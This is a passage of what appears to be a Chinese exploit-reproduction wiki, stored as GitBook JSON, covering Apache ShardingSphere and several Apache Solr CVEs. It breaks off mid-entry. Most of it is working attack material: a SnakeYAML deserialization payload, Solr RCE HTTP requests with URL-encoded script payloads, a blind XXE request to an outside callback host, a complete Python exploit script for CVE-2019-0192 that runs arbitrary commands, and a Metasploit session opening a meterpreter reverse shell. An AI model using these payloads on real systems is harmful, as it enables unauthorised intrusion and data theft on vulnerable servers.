CustomXMLMappings.zip\"并解压文件。 编辑 CustomXMLMappings/xl/xmlMaps.xml 文件。 在 xsd:schema 标签里面加上一行代码。 ApachePOI 然后把xlsx释放出来的所有文件再用zip打包回去，改成 CustomXMLMappings.xlsx。 最后一步监听本地8080端口，运行POC。ApachePOI Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:10 "},"Web安全/Apache ShardingSphere/（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞/（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞.html":{"url":"Web安全/Apache ShardingSphere/（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞/（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞.html","title":"（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞","keywords":"","body":"（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞 一、漏洞简介 二、漏洞影响 Apache ShardingSphere \\ 三、复现过程 Sharding-UI的默认密码为admin/admin ApacheShardingSphere远程代码执行漏洞/media/rId24.png) 顺带一提，在conf/application.properties中存储了WEB端的端口和账号密码。 ApacheShardingSphere远程代码执行漏洞/media/rId25.png) 安装Zookeeper 要想成功利用，需要先在Sharding-UI中添加一个注册中心，否则在后续利用中会提示No activated registry center!，所以需要搭建一个Zookeeper。 这里直接使用docker搭建Zookeeper，并且将2181端口映射出来到本地的2181端口。 docker pull zookeeper docker run --privileged=true -d --name zookeeper --publish 2181:2181 -d zookeeper:latest 配置registry-center 在Sharding-UI的registry-center模块配置Zookeeper的地址。 ApacheShardingSphere远程代码执行漏洞/media/rId28.png) 成功连接即可。 ApacheShardingSphere远程代码执行漏洞/media/rId29.png) 生成payload 使用SnakeYAML反序列化小工具： https://github.com/ianxtianxt/yaml-payload 修改src/artsploit/AwesomeScriptEngineFactory.java文件，设置为弹出计算器。 ApacheShardingSphere远程代码执行漏洞/media/rId31.png) 编译生成jar包： javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . 然后使用python本地搭建HTTPServer，等待连接。 python -m SimpleHTTPServer 90 代码执行 在web端的Rule Config------>Add Schema处加入YAML代码并提交。 ApacheShardingSphere远程代码执行漏洞/media/rId33.png) 数据包正文： {\"name\":\"test\",\"ruleConfiguration\":\"encryptors:\\n :\\n type: MD5\\n props:\",\"dataSourceConfiguration\":\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://localhost:90/yaml-payload.jar\\\"]]]]\"} 发送即可成功弹出计算器。 ApacheShardingSphere远程代码执行漏洞/media/rId34.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:12 "},"Web安全/Apache Solr/（CVE-2017-12629）Apache Solr rce&xxe 漏洞/（CVE-2017-12629）Apache Solr rce&xxe 漏洞.html":{"url":"Web安全/Apache Solr/（CVE-2017-12629）Apache Solr rce&xxe 漏洞/（CVE-2017-12629）Apache Solr rce&xxe 漏洞.html","title":"（CVE-2017-12629）Apache Solr rce&xxe 漏洞","keywords":"","body":"（CVE-2017-12629）Apache Solr rce&xxe 漏洞 一、漏洞简介 二、漏洞影响 Redhat Single Sign-On 7.0+ Redhat Linux 6.2 E sparc+ Redhat Linux 6.2 E i386+ Redhat Linux 6.2 E alpha+ Redhat Linux 6.2 sparc+ Redhat Linux 6.2 i386+ Redhat Linux 6.2 alphaRedhat JBoss Portal Platform 6Redhat JBoss EAP 7 0Redhat Jboss EAP 6Redhat JBoss Data Grid 7.0.0Redhat Enterprise Linux 6+ Trustix Secure Enterprise Linux 2.0+ Trustix Secure Linux 2.2+ Trustix Secure Linux 2.1+ Trustix Secure Linux 2.0Redhat Collections for Red Hat Enterprise Linux 0Apache Solr 6.6.1Apache Solr 6.6Apache Solr 6.5.1Apache Solr 6.5Apache Solr 6.4Apache Solr 6.3Apache Solr 6.2Apache Solr 6.6Apache Solr 6.3Apache Solr 6.0Apache Lucene 0 三、复现过程 rce 姿势一 首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数： POST /solr/demo/config HTTP/1.1 Host: 10.0.83.79:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 158 {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newlistener\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"touch /tmp/success\"]}} ApacheSolrrce&xxe漏洞/media/rId25.png) 在solr管理界面新建了listen ApacheSolrrce&xxe漏洞/media/rId26.png) 然后进行update操作，触发刚才添加的listener： POST /solr/demo/update HTTP/1.1 Host: 10.0.83.79:8983 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 15 [{\"id\":\"test\"}] ApacheSolrrce&xxe漏洞/media/rId27.png) rce 姿势二 ApacheSolrrce&xxe漏洞/media/rId29.png) 如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC： 点击Execute with this Confuguration会发送以下请求包： payload(这里我直接填无法命令执行替换如下payload) POST /solr/test/dataimport?_=1565835261600&indent=on&wt=json HTTP/1.1 Host: 10.0.83.79:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 679 Connection: close Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport ApacheSolrrce&xxe漏洞/media/rId30.png) xxe 由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）： GET /solr/demo/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20root%20%5B%0A%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//xxe.rqe94e.ceye.io/%22%3E%0A%25remote%3B%5D%3E%0A%3Croot/%3E&wt=xml&defType=xmlparser HTTP/1.1 Host: your-ip:8983 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close 使用ceye 发送payload ApacheSolrrce&xxe漏洞/media/rId32.png) ceye接收 ApacheSolrrce&xxe漏洞/media/rId33.png) 参考链接 https://wh0ale.github.io/2019/08/26/Apache-Solr安全问题/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:15 "},"Web安全/Apache Solr/（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞/（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞.html":{"url":"Web安全/Apache Solr/（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞/（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞.html","title":"（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞","keywords":"","body":"（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞 一、漏洞简介 Apache Solr中的ConfigAPI允许设置一个jmx.serviceUrl，它将创建一个新的JMXConnectorServerFactory，并通过\"绑定\"操作触发对目标RMI/LDAP服务器的调用。恶意的RMI服务器可以响应任意的对象，这些对象将在Solr端使用java的ObjectInputStream反序列化，这被认为是不安全的。这种类型的漏洞可以利用ysoserial工具。根据目标类路径，攻击者可以使用其中一个\"gadget chain\"来触发Solr端上的远程代码执行。 二、漏洞影响 Apache Solr 5.0.0 to 5.5.5 Apache Solr 6.0.0 to 6.6.5 三、复现过程 下载Apache Solr 5.5.3版本作为靶机（注意，一定要使用jre7u25以下jre），执行solr -e techproducts -Dcom.sun.management.jmxremote指令开启服务。 使用ysoserial工具，执行Java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12363 Jdk7u21 \\\"calc\\\"指令，监听12363**端口。然后传入以下数据： POST /solr/techproducts/config HTTP/1.1 Host: 0-sec.org:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-type:application/json Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 91 {\"set-property\" : {\"jmx.serviceUrl\" : \"service:jmx:rmi:///jndi/rmi://127.0.0.1:12363/obj\"}} poc 下载yoserial,并将value修改为一下内容 remote = \"http://172.18.0.5:8983\" ressource = \"\" RHOST = \"172.18.0.1\" RPORT = \"1099\" 然后执行一下脚本 import base64 import requests import subprocess import signal import sys import os import time import re remote = \"http://172.18.0.5:8983\" ressource = \"\" RHOST = \"172.18.0.1\" RPORT = \"1099\" proxy = { } def exploit(command): print(\"\\n Run the malicious RMI server using yoserial by running this command:\") print(\"\\n java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21\" + command) if __name__ == \"__main__\": print(\"\\nCVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5\\n\") print(\"[+] Checking if ressource available =>\", end=' ') burp0_url = remote + \"/solr/admin/cores?wt=json\" r = requests.get(burp0_url, proxies=proxy, verify=False, allow_redirects=False) if r.status_code == 200: if r.json()['status'] == \"\": print(\"KO\") sys.exit() else: a = list(r.json()['status'].keys()) ressource = \"/solr/\" + a[0] + \"/config\" print(ressource) else: print(\"KO\") sys.exit() while True: try: command = input(\"command (\\033[92mnot reflected\\033[0m)> \") if command == \"exit\": print(\"Exiting...\") break command = base64.b64encode(command.encode('utf-8')) command_str = command.decode('utf-8') command_str = command_str.replace('/', '+') pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'cp /etc/passwd /tmp/passwd'\", stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid) print(\"[+] Copy file to tmp directory =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: m = re.search('(undeclared checked exception; nested exception is)', r.text) if m: print(\"\\033[92mOK\\033[0m\") else: print(\"\\n[-] Error\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i 1cpwn /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Preparing file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i /[^pwn]/d /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Cleaning temp file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i 1s/pwn/{echo,\" + command_str + \"}|{base64,-d}>pwn.txt/g /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Writing command into temp file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'bash /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Decode base64 command =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'bash pwn.txt'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Executing command =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) except KeyboardInterrupt: print(\"Exiting...\") break 参考链接 https://github.com/mpgn/CVE-2019-0192 https://mp.weixin.qq.com/s?\\_\\_biz=MzI4NjE2NjgxMQ==&mid=2650237094&idx=1&sn=4125bf632680d991f38f9f147657b38d&chksm=f3e2d2d2c4955bc4894b3098ca11cbe7d9917c23e173c87b7fe2f02c84b195aea381746567a3&scene=21\\#wechat\\_redirect Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:17 "},"Web安全/Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞/（CVE-2019-0193）Apache Solr 远程命令执行漏洞.html":{"url":"Web安全/Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞/（CVE-2019-0193）Apache Solr 远程命令执行漏洞.html","title":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞","keywords":"","body":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞 一、漏洞简介 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 二、漏洞影响 Apache Solr \\ 三、复现过程 poc 一 ：需要目标出网，支持低版本检测 判断该索引库是否使用了DataImportHandler模块 访问 http://www.0-sec.org:8983/solr/test_0nth3way/admin/mbeans?cat=QUERY&wt=json 如果使用了DataImportHandler模块 则HTTP响应内会有:org.apache.solr.handler.dataimport.DataImportHandler 1.png 构造HTTP请求，远程执行代码 POST /solr/test_0nth3way/dataimport HTTP/1.1 Host: www.0-sec.org:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.17.136:8983/solr/ Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 1231 Connection: close command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test_0nth3way&name=dataimport&dataConfig= demo.xml 若如上github因不可抗因素失效，可自行用自己vps搭建demo.xml 2.png poc 二 ：不需要目标出网，不支持低版本检测 判断该索引库是否使用了DataImportHandler模块（同上） 修改configoverlay.json文件中的配置，以启用远程流的相关选项 （enableStreamBody、enableRemoteStreaming） 注：某些低版本会不成功，即响应500；成功响应200 POST /solr/test_0nth3way/config HTTP/1.1 Host: www.0-sec.org:8983 Accept: */* Content-type:application/json Content-Length: 159 Connection: close {\"set-property\": {\"requestDispatcher.requestParsers.enableRemoteStreaming\": true}, \"set-property\": {\"requestDispatcher.requestParsers.enableStreamBody\": true}} 构造HTTP请求，远程执行代码 POST /solr/test_0nth3way/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test_0nth3way&name=dataimport&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e HTTP/1.1 Host: www.0-sec.org:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.17.136:8983/solr/ Content-Length: 212 content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f --------------------------aceb88c2159f183f Content-Disposition: form-data; name=\"stream.body\" --------------------------aceb88c2159f183f-- 注：其中dataConfig的值，URLencode之前为以下字符串 3.png 参考链接 https://www.cnblogs.com/0nth3way/p/11908763.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:17 "},"Web安全/Apache Solr/（CVE-2019-12409）Apache Solr 远程命令执行漏洞/（CVE-2019-12409）Apache Solr 远程命令执行漏洞.html":{"url":"Web安全/Apache Solr/（CVE-2019-12409）Apache Solr 远程命令执行漏洞/（CVE-2019-12409）Apache Solr 远程命令执行漏洞.html","title":"（CVE-2019-12409）Apache Solr 远程命令执行漏洞","keywords":"","body":"（CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞 一、漏洞简介 Linux 下的环境下的Apache Solr 8.1.1和8.2.0版本 存在默认不安全配置在solr.shENABLE_REMOTE_JMX_OPTS=\"true\",将导致启用JMX监视服务并将公网监听一个18983的RMI端口，且无需进行任何身份验证。 二、漏洞影响 Apache Solr 8.1.1和8.2.0版本 三、复现过程 msf5 > use multi/misc/java_jmx_server msf5 exploit(multi/misc/java_jmx_server) > show options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS yes The target address range or CIDR identifier RPORT yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > set RHOSTS a.a.a.a RHOSTS => a.a.a.a msf5 exploit(multi/misc/java_jmx_server) > set RPORT 18983 RPORT => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > show options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS a.a.a.a yes The target address range or CIDR identifier RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > set LHOST b.b.b.b LHOST => b.b.b.b msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on b.b.b.b:4444 [*] a.a.a.a:18983 - Using URL: http://b.b.b.b:8080/OcbYS8uaTPDH [*] a.a.a.a:18983 - Sending RMI Header... [*] a.a.a.a:18983 - Discovering the JMXRMI endpoint... [+] a.a.a.a:18983 - JMXRMI endpoint on a.a.a.a:18983 [*] a.a.a.a:18983 - Proceeding with handshake... [+] a.a.a.a:18983 - Handshake with JMX MBean server on a.a.a.a:18983 [*] a.a.a.a:18983 - Loading payload... [*] a.a.a.a:18983 - Replied to request for mlet [*] a.a.a.a:18983 - Replied to request for payload JAR [*] a.a.a.a:18983 - Executing payload... [*] a.a.a.a:18983 - Replied to request for payload JAR [*] Sending stage (53867 bytes) to a.a.a.a [*] Meterpreter session 1 opened (a.a.a.a:4444 -> b.b.b.b:46582) at 2019-11-21 15:24:53 +0000 meterpreter > Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:17 "},"Web安全/Apache Solr/（CVE-2019-17558）Apache Solr 代码注入漏洞/（CVE-2019-17558）Apache Solr 代码注入漏洞.html":{"url":"Web安全/Apache Solr/（CVE-2019-17558）Apache Solr 代码注入漏洞/（CVE-2019-17558）Apache Solr 代码注入漏洞.html","title":"（CVE-2019-17558）Apache Solr 代码注入漏洞","keywords":"","body":"（CVE-2019-17558）Apache Solr 代码注入漏洞 一、漏洞简介 Apache Solr 5.0.0版本至8.3.1版本中存在代码注入漏洞。攻击者通过未授权访问solr服务器，发送特定的数据包开启paramsresource.loader.enabled，然后get访问接口导致服务器命令执行，命令回显结果在response 二、漏洞影响 Apache Solr 5.0.0版本至8.3.1 三、复现过程 环境搭建 https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2 https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/solr-7.7.2.zip velocity.solrresource.loader.enabled:true /opt/solr-7.7.2/example/example-DIH/solr/atom/conf/solrconfig.xml root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf# cat solrconfig.xml | grep enable true ${velocity.solrresource.loader.enabled:false} ${velocity.paramsresource.loader.enabled:false} [email protected]/* */:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf# 开启dih 示例 ./solr -e dih -force [email protected]/* */:/opt/solr-7.7.2/bin# ./solr -e dih -force *** [WARN] *** Your open file limit is currently 1024. It should be set to 65000 to avoid operational disruption. If you no longer wish to see this warning, set SOLR_ULIMIT_CHECKS to false in your profile or solr.in.sh Starting up Solr on port 8983 using command: \"/opt/solr-7.7.2/bin/solr\" start -p 8983 -s \"/opt/solr-7.7.2/example/example-DIH/solr\" -force Waiting up to 180 seconds to see Solr running on port 8983 [\\] Started Solr server on port 8983 (pid=20222). Happy searching! Solr dih example launched successfully. Direct your Web browser to http://localhost:8983/solr to visit the Solr Admin UI [email protected]/* */:/opt/solr-7.7.2/bin# 浏览器访问 http://10.10.20.166:8983/solr/#/ ApacheSolr代码注入漏洞/media/rId27.jpg) 到此，漏洞环境搭建完成。 漏洞复现 用户在打开网站时候，再burpsuite里面会发现一个接口，可以获取所有core name的名称，方便后续遍历core name，拼接字符串,依次检测漏洞 ApacheSolr代码注入漏洞/media/rId29.jpg) http://www.0-sec.org:8983/solr/admin/cores?_=1572594549070&indexInfo=false&wt=json 简写为 